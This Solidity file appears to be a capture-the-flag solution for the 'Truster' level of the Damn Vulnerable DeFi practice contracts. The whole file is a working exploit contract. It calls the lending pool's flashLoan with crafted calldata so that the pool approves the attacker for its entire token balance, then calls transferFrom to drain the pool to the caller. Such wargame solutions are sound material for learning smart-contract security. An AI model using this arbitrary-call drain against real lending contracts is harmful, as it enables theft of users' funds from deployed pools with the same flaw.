// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract TrusterAttack {

    TrusterLenderPool public immutable pool;
    DamnValuableToken public immutable token;  

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
    }

    function attack() public {
        uint256 poolBalance = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), poolBalance
        );
        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(pool), msg.sender, poolBalance);
    }


}